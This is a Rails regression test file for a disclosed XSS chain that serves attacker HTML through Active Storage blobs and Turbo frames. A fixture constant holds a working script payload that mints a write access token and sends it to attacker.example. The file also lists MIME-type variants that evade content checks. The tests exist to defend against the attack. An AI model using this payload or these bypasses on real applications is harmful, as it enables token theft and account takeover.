require "test_helper"

# Regression coverage for HackerOne #3943339.
#
# An attacker uploads an *unattached* Active Storage blob whose client-supplied
# content type is "text/html;charset=utf-8" (the parameterized MIME slips past
# Active Storage's exact-string binary list), then poisons a public board's
# automatic-pagination link so a signed-in victim's browser fetches the blob
# through the same-origin Active Storage proxy. Turbo renders the response as a
# live frame and executes the inline <script>, which mints and exfiltrates a
# victim Identity access token.
#
# These tests pin the server-side invariants that break the chain:
#   1. lib/rails_ext/active_storage_authorization.rb must NOT authorize an
#      unattached blob to a principal outside the blob's account.
#   2. Even for an in-account principal, HTML/XML/SVG and unattached blobs must
#      be served as application/octet-stream, never as executable text/html.
#   3. app/helpers/pagination_helper.rb must not forward url_for control options
#      (script_name, host, ...) from request params into the pagination href.
class PaginationBlobHtmlXssTest < ActionDispatch::IntegrationTest
  ATTACKER_HTML = <<~HTML.freeze
    <turbo-frame id="stream_column-pagination-contents-2"><script>void async function(){const csrf=document.querySelector("meta[name=csrf-token]").content;const response=await fetch("/my/access_tokens.json",{method:"POST",credentials:"same-origin",headers:{"Content-Type":"application/json","X-CSRF-Token":csrf},body:JSON.stringify({access_token:{description:"exfil",permission:"write"}})});const {token}=await response.json();location.href="http://attacker.example/collect?token="+encodeURIComponent(token)}()</script></turbo-frame>
  HTML

  # Link 3 (authorization fail-open): an unattached blob created in the
  # attacker's account (37s) must be forbidden to a victim from another account
  # (mike belongs to initech). The pre-fix `attachments.none?` fail-open
  # authorizes it regardless of account membership.
  test "unattached blob is not served to a cross-account principal" do
    blob = create_unattached_html_blob

    sign_in_as :mike

    get rails_storage_proxy_path(blob)
    assert_response :forbidden
  end

  # Link 4 (parameterized-MIME inline serving): even the blob's own-account
  # owner must never receive an unattached HTML blob as executable text/html.
  # The proxy boundary must normalize it to application/octet-stream.
  test "unattached html blob is served as octet-stream, never executable html" do
    blob = create_unattached_html_blob

    sign_in_as :david

    get rails_storage_proxy_path(blob)

    assert_response :success
    assert_equal "application/octet-stream", response.media_type,
      "unattached/text-html blob must not be served as executable text/html"
    assert_match %r{attachment}, response.headers["Content-Disposition"].to_s
  end

  # Link 4, malformed variant: a declared type such as "text/html,foo" is not a
  # canonical MIME type, so splitting only on ";" leaves it intact — it matches
  # neither our dangerous list nor Active Storage's exact binary list — yet a
  # client can still treat its "text/html" prefix as HTML. The essence must
  # normalize down to text/html and be forced to binary.
  test "unattached blob with a malformed text/html type is served as octet-stream" do
    blob = create_unattached_html_blob(content_type: "text/html,foo")

    sign_in_as :david

    get rails_storage_proxy_path(blob)

    assert_response :success
    assert_equal "application/octet-stream", response.media_type,
      "a malformed text/html type must not be served as executable html"
    assert_match %r{attachment}, response.headers["Content-Disposition"].to_s
  end

  # Link 4, Turbo-matcher variants: Turbo's own FetchResponse#isHTML matcher
  # (/^(?:text\/([^\s;,]+\b)?html|application\/xhtml\+xml)\b/) renders a whole
  # family of non-canonical declared types as HTML in a frame, well beyond the
  # canonical "text/html". Each of these must be forced to octet-stream or the
  # script-execution sink stays open (HackerOne #3943339).
  %w[
    text/x-html
    text/html+json
    text/vnd.turbo-stream.html
    application/xhtml+xml+xxe
    text/htmlé
  ].each do |declared_type|
    test "unattached blob declared #{declared_type} is served as octet-stream" do
      blob = create_unattached_html_blob(content_type: declared_type)

      sign_in_as :david

      get rails_storage_proxy_path(blob)

      assert_response :success
      assert_equal "application/octet-stream", response.media_type,
        "#{declared_type} is rendered as HTML by Turbo's frame matcher and must not be served inline"
      assert_match %r{attachment}, response.headers["Content-Disposition"].to_s
    end
  end

  # Documents the downstream sink (link 5): the token-mint endpoint is reachable
  # from any authenticated identity and returns a raw identity-scoped write
  # token. Not changed by this fix — the chain is broken upstream — but pinned so
  # a regression that re-opens the upstream links is understood to be critical.
  test "access token mint endpoint returns a raw identity-scoped write token" do
    sign_in_as :david

    post my_access_tokens_path(format: :json),
      params: { access_token: { description: "probe", permission: "write" } }

    assert_response :created
    body = JSON.parse(response.body)
    assert body["token"].present?, "mint endpoint must return the raw token"
    assert_equal "write", body["permission"]
  end

  private
    # Mirrors Fizzy's S3 direct-upload path: create_before_direct_upload! stores
    # the client-supplied content type verbatim (no re-identification), then the
    # bytes are written straight to the service. The blob is left UNATTACHED.
    def create_unattached_html_blob(content_type: "text/html;charset=utf-8")
      html = ATTACKER_HTML
      blob = Current.with(account: accounts("37s"), session: sessions(:david)) do
        ActiveStorage::Blob.create_before_direct_upload! \
          filename: "video-exfil.html",
          content_type: content_type,
          byte_size: html.bytesize,
          checksum: OpenSSL::Digest::MD5.base64digest(html)
      end
      blob.upload_without_unfurling(StringIO.new(html))
      blob
    end
end
